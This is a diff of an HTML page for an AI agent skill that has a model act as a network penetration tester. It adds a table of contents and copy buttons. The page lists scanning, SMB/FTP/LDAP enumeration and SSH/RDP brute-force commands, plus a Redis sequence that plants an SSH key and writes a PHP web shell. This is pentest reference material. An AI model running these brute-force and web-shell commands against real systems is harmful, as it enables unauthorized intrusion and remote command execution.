@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Enumerate and exploit network services including SMB, FTP, SSH, RDP, HTTP, databases (MySQL, MSSQL, PostgreSQL, MongoDB), LDAP, NFS, DNS, and SNMP. Use when testing network service security or performing port-based exploitation.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>You are a network penetration testing expert specializing in service enumeration and exploitation. Use this skill when the user requests help with:</p>
+<div class="wrap slayout"><article><p>You are a network penetration testing expert specializing in service enumeration and exploitation. Use this skill when the user requests help with:</p>
 <ul>
 <li>Enumerating network services by port</li>
 <li>Exploiting common network services (SMB, FTP, SSH, RDP, etc.)</li>
@@ -48,7 +60,7 @@
 <li>Banner grabbing and version detection</li>
 <li>Network protocol analysis</li>
 </ul>
-<h2>When to Use</h2>
+<h2 id="when-to-use">When to Use</h2>
 <p>Activate this skill when the user asks to:</p>
 <ul>
 <li>Enumerate network services on specific ports</li>
@@ -59,7 +71,7 @@
 <li>Extract data from network services</li>
 <li>Help with network penetration testing</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Source code is available</strong> — use <a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a></li>
 <li><strong>Web application layer specifically</strong> — use <a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a></li>
@@ -68,10 +80,10 @@
 <li><strong>ICS/OT protocols on the network</strong> (Modbus/502, DNP3, S7comm/102, OPC UA,</li>
 </ul>
 <p>BACnet) — use <a class="xref" href="testing-ics-ot-protocols.html"><code>testing-ics-ot-protocols</code></a>; scanning these the way you scan IT services can crash a PLC, and the safety rules differ</p>
-<h2>Core Methodologies</h2>
+<h2 id="core-methodologies">Core Methodologies</h2>
 <h3>1. Port Scanning and Service Discovery</h3>
 <p><strong>Nmap Scanning Strategies:</strong></p>
-<pre><code># Quick TCP scan
+<div class="codeblk cx"><button class="copy" data-copy="# Quick TCP scan
 nmap -sC -sV -oA scan 10.10.10.10
 
 # Full TCP port scan
@@ -92,16 +104,64 @@ nmap -p 21 --script ftp-* 10.10.10.10
 nmap -sV --version-intensity 9 10.10.10.10
 
 # OS detection
-sudo nmap -O 10.10.10.10</code></pre>
+sudo nmap -O 10.10.10.10">copy</button><pre><code># Quick TCP scan
+nmap -sC -sV -oA scan 10.10.10.10
+
+# Full TCP port scan
+nmap -p- -T4 10.10.10.10
+nmap -p- -sV -sC -A 10.10.10.10 -oA full-scan
+
+# UDP scan (top 1000)
+sudo nmap -sU --top-ports 1000 10.10.10.10
+
+# Aggressive scan
+nmap -A -T4 10.10.10.10
+
+# Specific port scan with scripts
+nmap -p 445 --script smb-* 10.10.10.10
+nmap -p 21 --script ftp-* 10.10.10.10
+
+# Service version detection
+nmap -sV --version-intensity 9 10.10.10.10
+
+# OS detection
+sudo nmap -O 10.10.10.10</code></pre></div>
 <p><strong>Fast Port Scanning:</strong></p>
-<pre><code># masscan - very fast
+<div class="codeblk cx"><button class="copy" data-copy="# masscan - very fast
 masscan -p1-65535 10.10.10.10 --rate=1000
 
 # rustscan - fast with nmap integration
-rustscan -a 10.10.10.10 -- -sC -sV</code></pre>
+rustscan -a 10.10.10.10 -- -sC -sV">copy</button><pre><code># masscan - very fast
+masscan -p1-65535 10.10.10.10 --rate=1000
+
+# rustscan - fast with nmap integration
+rustscan -a 10.10.10.10 -- -sC -sV</code></pre></div>
 <h3>2. SMB/SAMBA (Port 139, 445)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Nmap SMB scripts
+<div class="codeblk cx"><button class="copy" data-copy="# Nmap SMB scripts
+nmap -p 445 --script smb-protocols 10.10.10.10
+nmap -p 445 --script smb-security-mode 10.10.10.10
+nmap -p 445 --script smb-enum-shares 10.10.10.10
+nmap -p 445 --script smb-enum-users 10.10.10.10
+
+# smbclient - list shares
+smbclient -L //10.10.10.10 -N
+smbclient -L //10.10.10.10 -U username
+
+# smbmap
+smbmap -H 10.10.10.10
+smbmap -H 10.10.10.10 -u username -p password
+smbmap -H 10.10.10.10 -u username -p password -R  # Recursive listing
+
+# enum4linux
+enum4linux -a 10.10.10.10
+enum4linux -U -M -S -P -G 10.10.10.10
+
+# NetExec (nxc, formerly CrackMapExec)
+nxc smb 10.10.10.10
+nxc smb 10.10.10.10 -u &#x27;&#x27; -p &#x27;&#x27;  # Null session
+nxc smb 10.10.10.10 -u username -p password --shares
+nxc smb 10.10.10.10 -u username -p password --users">copy</button><pre><code># Nmap SMB scripts
 nmap -p 445 --script smb-protocols 10.10.10.10
 nmap -p 445 --script smb-security-mode 10.10.10.10
 nmap -p 445 --script smb-enum-shares 10.10.10.10
@@ -124,9 +184,9 @@ enum4linux -U -M -S -P -G 10.10.10.10
 nxc smb 10.10.10.10
 nxc smb 10.10.10.10 -u '' -p ''  # Null session
 nxc smb 10.10.10.10 -u username -p password --shares
-nxc smb 10.10.10.10 -u username -p password --users</code></pre>
+nxc smb 10.10.10.10 -u username -p password --users</code></pre></div>
 <p><strong>Connect to Shares:</strong></p>
-<pre><code># smbclient
+<div class="codeblk cx"><button class="copy" data-copy="# smbclient
 smbclient //10.10.10.10/share -U username
 smbclient //10.10.10.10/share -N  # Null session
 
@@ -134,16 +194,28 @@ smbclient //10.10.10.10/share -N  # Null session
 mount -t cifs //10.10.10.10/share /mnt/smb -o username=user,password=pass
 
 # Download all files recursively
-smbget -R smb://10.10.10.10/share -U username</code></pre>
+smbget -R smb://10.10.10.10/share -U username">copy</button><pre><code># smbclient
+smbclient //10.10.10.10/share -U username
+smbclient //10.10.10.10/share -N  # Null session
+
+# Mount SMB share
+mount -t cifs //10.10.10.10/share /mnt/smb -o username=user,password=pass
+
+# Download all files recursively
+smbget -R smb://10.10.10.10/share -U username</code></pre></div>
 <p><strong>SMB Vulnerabilities:</strong></p>
-<pre><code># EternalBlue (MS17-010)
+<div class="codeblk cx"><button class="copy" data-copy="# EternalBlue (MS17-010)
 nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10
 
 # Other SMB vulns
-nmap -p 445 --script smb-vuln-* 10.10.10.10</code></pre>
+nmap -p 445 --script smb-vuln-* 10.10.10.10">copy</button><pre><code># EternalBlue (MS17-010)
+nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10
+
+# Other SMB vulns
+nmap -p 445 --script smb-vuln-* 10.10.10.10</code></pre></div>
 <h3>3. FTP (Port 21)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Connect anonymously
+<div class="codeblk cx"><button class="copy" data-copy="# Connect anonymously
 ftp 10.10.10.10
 # user: anonymous, pass: anonymous
 
@@ -153,18 +225,34 @@ nmap -p 21 --script ftp-bounce 10.10.10.10
 nmap -p 21 --script ftp-brute 10.10.10.10
 
 # Download all files
-wget -r ftp://anonymous:anonymous@10.10.10.10/</code></pre>
+wget -r ftp://anonymous:anonymous@10.10.10.10/">copy</button><pre><code># Connect anonymously
+ftp 10.10.10.10
+# user: anonymous, pass: anonymous
+
+# Nmap FTP scripts
+nmap -p 21 --script ftp-anon 10.10.10.10
+nmap -p 21 --script ftp-bounce 10.10.10.10
+nmap -p 21 --script ftp-brute 10.10.10.10
+
+# Download all files
+wget -r ftp://anonymous:anonymous@10.10.10.10/</code></pre></div>
 <p><strong>FTP Commands:</strong></p>
-<pre><code># In FTP session
+<div class="codeblk cx"><button class="copy" data-copy="# In FTP session
 ls -la
 cd directory
 get filename  # Download
 mget *  # Download multiple
 put filename  # Upload
-binary  # Set binary mode for binaries</code></pre>
+binary  # Set binary mode for binaries">copy</button><pre><code># In FTP session
+ls -la
+cd directory
+get filename  # Download
+mget *  # Download multiple
+put filename  # Upload
+binary  # Set binary mode for binaries</code></pre></div>
 <h3>4. SSH (Port 22)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Banner grab
+<div class="codeblk cx"><button class="copy" data-copy="# Banner grab
 nc 10.10.10.10 22
 nmap -p 22 -sV 10.10.10.10
 
@@ -172,19 +260,34 @@ nmap -p 22 -sV 10.10.10.10
 ./ssh-user-enum.py --port 22 --userList users.txt 10.10.10.10
 
 # Brute force (use carefully)
-hydra -l root -P wordlist.txt ssh://10.10.10.10</code></pre>
+hydra -l root -P wordlist.txt ssh://10.10.10.10">copy</button><pre><code># Banner grab
+nc 10.10.10.10 22
+nmap -p 22 -sV 10.10.10.10
+
+# Enumerate users
+./ssh-user-enum.py --port 22 --userList users.txt 10.10.10.10
+
+# Brute force (use carefully)
+hydra -l root -P wordlist.txt ssh://10.10.10.10</code></pre></div>
 <p><strong>SSH Key Auth:</strong></p>
-<pre><code># Connect with key
+<div class="codeblk cx"><button class="copy" data-copy="# Connect with key
 ssh -i id_rsa user@10.10.10.10
 
 # Fix key permissions
 chmod 600 id_rsa
 
 # Generate SSH key pair
-ssh-keygen -t rsa -b 4096</code></pre>
+ssh-keygen -t rsa -b 4096">copy</button><pre><code># Connect with key
+ssh -i id_rsa user@10.10.10.10
+
+# Fix key permissions
+chmod 600 id_rsa
+
+# Generate SSH key pair
+ssh-keygen -t rsa -b 4096</code></pre></div>
 <h3>5. HTTP/HTTPS (Port 80, 443, 8080, 8443)</h3>
 <p><strong>Web Enumeration:</strong></p>
-<pre><code># Whatweb - identify web technologies
+<div class="codeblk cx"><button class="copy" data-copy="# Whatweb - identify web technologies
 whatweb http://10.10.10.10
 
 # Nikto vulnerability scanner
@@ -200,45 +303,98 @@ gobuster dns -d example.com -w subdomains.txt
 ffuf -u http://FUZZ.example.com -w subdomains.txt
 
 # Virtual host discovery
-gobuster vhost -u http://10.10.10.10 -w vhosts.txt</code></pre>
+gobuster vhost -u http://10.10.10.10 -w vhosts.txt">copy</button><pre><code># Whatweb - identify web technologies
+whatweb http://10.10.10.10
+
+# Nikto vulnerability scanner
+nikto -h http://10.10.10.10
+
+# Directory/file bruteforce
+gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
+feroxbuster -u http://10.10.10.10 -w wordlist.txt
+ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt
+
+# DNS subdomain enumeration
+gobuster dns -d example.com -w subdomains.txt
+ffuf -u http://FUZZ.example.com -w subdomains.txt
+
+# Virtual host discovery
+gobuster vhost -u http://10.10.10.10 -w vhosts.txt</code></pre></div>
 <p><strong>SSL/TLS Testing:</strong></p>
-<pre><code># Check SSL certificate
+<div class="codeblk cx"><button class="copy" data-copy="# Check SSL certificate
 openssl s_client -connect 10.10.10.10:443
 
 # SSL vulnerabilities
 nmap -p 443 --script ssl-* 10.10.10.10
-testssl.sh https://10.10.10.10</code></pre>
+testssl.sh https://10.10.10.10">copy</button><pre><code># Check SSL certificate
+openssl s_client -connect 10.10.10.10:443
+
+# SSL vulnerabilities
+nmap -p 443 --script ssl-* 10.10.10.10
+testssl.sh https://10.10.10.10</code></pre></div>
 <h3>6. RDP (Port 3389)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Nmap
+<div class="codeblk cx"><button class="copy" data-copy="# Nmap
 nmap -p 3389 --script rdp-* 10.10.10.10
 
 # Check if RDP is enabled
-nmap -p 3389 -sV 10.10.10.10</code></pre>
+nmap -p 3389 -sV 10.10.10.10">copy</button><pre><code># Nmap
+nmap -p 3389 --script rdp-* 10.10.10.10
+
+# Check if RDP is enabled
+nmap -p 3389 -sV 10.10.10.10</code></pre></div>
 <p><strong>Connect:</strong></p>
-<pre><code># rdesktop
+<div class="codeblk cx"><button class="copy" data-copy="# rdesktop
 rdesktop 10.10.10.10
 
 # xfreerdp
 xfreerdp /u:Administrator /p:password /v:10.10.10.10
-xfreerdp /u:user /d:DOMAIN /v:10.10.10.10</code></pre>
+xfreerdp /u:user /d:DOMAIN /v:10.10.10.10">copy</button><pre><code># rdesktop
+rdesktop 10.10.10.10
+
+# xfreerdp
+xfreerdp /u:Administrator /p:password /v:10.10.10.10
+xfreerdp /u:user /d:DOMAIN /v:10.10.10.10</code></pre></div>
 <p><strong>Brute Force:</strong></p>
-<pre><code># hydra
+<div class="codeblk cx"><button class="copy" data-copy="# hydra
 hydra -l administrator -P passwords.txt rdp://10.10.10.10
 
 # crowbar
-crowbar -b rdp -s 10.10.10.10/32 -u admin -C passwords.txt</code></pre>
+crowbar -b rdp -s 10.10.10.10/32 -u admin -C passwords.txt">copy</button><pre><code># hydra
+hydra -l administrator -P passwords.txt rdp://10.10.10.10
+
+# crowbar
+crowbar -b rdp -s 10.10.10.10/32 -u admin -C passwords.txt</code></pre></div>
 <h3>7-10. Database Services (MySQL, MSSQL, PostgreSQL, MongoDB)</h3>
 <p>Full per-service enumeration and exploitation command catalogs for MySQL/MariaDB (3306), MSSQL (1433), PostgreSQL (5432), and MongoDB (27017) live in <a href="references/database-services.md">references/database-services.md</a>.</p>
 <h3>11. Redis (Port 6379)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Connect
+<div class="codeblk cx"><button class="copy" data-copy="# Connect
 redis-cli -h 10.10.10.10
 
 # Nmap
-nmap -p 6379 --script redis-* 10.10.10.10</code></pre>
+nmap -p 6379 --script redis-* 10.10.10.10">copy</button><pre><code># Connect
+redis-cli -h 10.10.10.10
+
+# Nmap
+nmap -p 6379 --script redis-* 10.10.10.10</code></pre></div>
 <p><strong>Redis Exploitation:</strong></p>
-<pre><code># In redis-cli
+<div class="codeblk cx"><button class="copy" data-copy="# In redis-cli
+INFO  # Server info
+CONFIG GET dir  # Get directory
+CONFIG GET dbfilename
+
+# Write SSH key
+CONFIG SET dir /root/.ssh/
+CONFIG SET dbfilename authorized_keys
+SET mykey &quot;ssh-rsa AAAA...&quot;
+SAVE
+
+# Write webshell
+CONFIG SET dir /var/www/html/
+CONFIG SET dbfilename shell.php
+SET mykey &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;
+SAVE">copy</button><pre><code># In redis-cli
 INFO  # Server info
 CONFIG GET dir  # Get directory
 CONFIG GET dbfilename
@@ -253,10 +409,18 @@ SAVE
 CONFIG SET dir /var/www/html/
 CONFIG SET dbfilename shell.php
 SET mykey "&lt;?php system($_GET['cmd']); ?&gt;"
-SAVE</code></pre>
+SAVE</code></pre></div>
 <h3>12. LDAP (Port 389, 636)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Nmap
+<div class="codeblk cx"><button class="copy" data-copy="# Nmap
+nmap -p 389 --script ldap-* 10.10.10.10
+
+# ldapsearch
+ldapsearch -x -H ldap://10.10.10.10 -b &quot;DC=domain,DC=local&quot;
+ldapsearch -x -H ldap://10.10.10.10 -D &quot;user@domain.local&quot; -w password -b &quot;DC=domain,DC=local&quot;
+
+# Dump all
+ldapsearch -x -H ldap://10.10.10.10 -b &quot;DC=domain,DC=local&quot; &quot;(objectClass=*)&quot;">copy</button><pre><code># Nmap
 nmap -p 389 --script ldap-* 10.10.10.10
 
 # ldapsearch
@@ -264,24 +428,33 @@ ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"
 ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local"
 
 # Dump all
-ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=*)"</code></pre>
+ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=*)"</code></pre></div>
 <h3>13. NFS (Port 2049)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Show exports
+<div class="codeblk cx"><button class="copy" data-copy="# Show exports
 showmount -e 10.10.10.10
 
 # Nmap
-nmap -p 2049 --script nfs-* 10.10.10.10</code></pre>
+nmap -p 2049 --script nfs-* 10.10.10.10">copy</button><pre><code># Show exports
+showmount -e 10.10.10.10
+
+# Nmap
+nmap -p 2049 --script nfs-* 10.10.10.10</code></pre></div>
 <p><strong>Mount NFS:</strong></p>
-<pre><code># Mount share
+<div class="codeblk cx"><button class="copy" data-copy="# Mount share
 mkdir /mnt/nfs
 mount -t nfs 10.10.10.10:/share /mnt/nfs
 
 # List mounted shares
-df -h</code></pre>
+df -h">copy</button><pre><code># Mount share
+mkdir /mnt/nfs
+mount -t nfs 10.10.10.10:/share /mnt/nfs
+
+# List mounted shares
+df -h</code></pre></div>
 <h3>14. DNS (Port 53)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># Zone transfer
+<div class="codeblk cx"><button class="copy" data-copy="# Zone transfer
 dig axfr @10.10.10.10 domain.com
 host -l domain.com 10.10.10.10
 
@@ -291,10 +464,20 @@ dnsrecon -d domain.com -t std
 fierce -dns domain.com
 
 # Nmap
-nmap -p 53 --script dns-* 10.10.10.10</code></pre>
+nmap -p 53 --script dns-* 10.10.10.10">copy</button><pre><code># Zone transfer
+dig axfr @10.10.10.10 domain.com
+host -l domain.com 10.10.10.10
+
+# DNS enumeration
+dnsenum domain.com
+dnsrecon -d domain.com -t std
+fierce -dns domain.com
+
+# Nmap
+nmap -p 53 --script dns-* 10.10.10.10</code></pre></div>
 <h3>15. SNMP (Port 161)</h3>
 <p><strong>Enumeration:</strong></p>
-<pre><code># snmpwalk
+<div class="codeblk cx"><button class="copy" data-copy="# snmpwalk
 snmpwalk -v2c -c public 10.10.10.10
 snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1
 
@@ -302,10 +485,18 @@ snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1
 onesixtyone -c community.txt 10.10.10.10
 
 # snmp-check
-snmp-check 10.10.10.10 -c public</code></pre>
-<h2>Quick Service Testing Commands</h2>
+snmp-check 10.10.10.10 -c public">copy</button><pre><code># snmpwalk
+snmpwalk -v2c -c public 10.10.10.10
+snmpwalk -v2c -c public 10.10.10.10 1.3.6.1.2.1.1
+
+# onesixtyone - community string brute force
+onesixtyone -c community.txt 10.10.10.10
+
+# snmp-check
+snmp-check 10.10.10.10 -c public</code></pre></div>
+<h2 id="quick-service-testing-commands">Quick Service Testing Commands</h2>
 <p><strong>Banner Grabbing:</strong></p>
-<pre><code># Netcat
+<div class="codeblk cx"><button class="copy" data-copy="# Netcat
 nc -nv 10.10.10.10 80
 nc -nv 10.10.10.10 21
 
@@ -314,14 +505,23 @@ telnet 10.10.10.10 80
 telnet 10.10.10.10 25
 
 # Nmap
-nmap -sV --script=banner 10.10.10.10</code></pre>
-<h2>Reference Links</h2>
+nmap -sV --script=banner 10.10.10.10">copy</button><pre><code># Netcat
+nc -nv 10.10.10.10 80
+nc -nv 10.10.10.10 21
+
+# Telnet
+telnet 10.10.10.10 80
+telnet 10.10.10.10 25
+
+# Nmap
+nmap -sV --script=banner 10.10.10.10</code></pre></div>
+<h2 id="reference-links">Reference Links</h2>
 <ul>
 <li>HackTricks Service Pentesting: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/network-services-pentesting</li>
 <li>PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings</li>
 <li>Nmap Scripts: https://nmap.org/nsedoc/</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Reconnaissance</strong> (TA0043)</p>
 <ul>
@@ -353,5 +553,8 @@ nmap -sV --script=banner 10.10.10.10</code></pre>
 <li><a href="https://attack.mitre.org/techniques/T1021/004/">T1021.004</a> SSH — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
 <li><a href="https://attack.mitre.org/techniques/T1210/">T1210</a> Exploitation of Remote Services</li>
 </ul>
-<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#core-methodologies">Core Methodologies</a><a href="#quick-service-testing-commands">Quick Service Testing Commands</a><a href="#reference-links">Reference Links</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
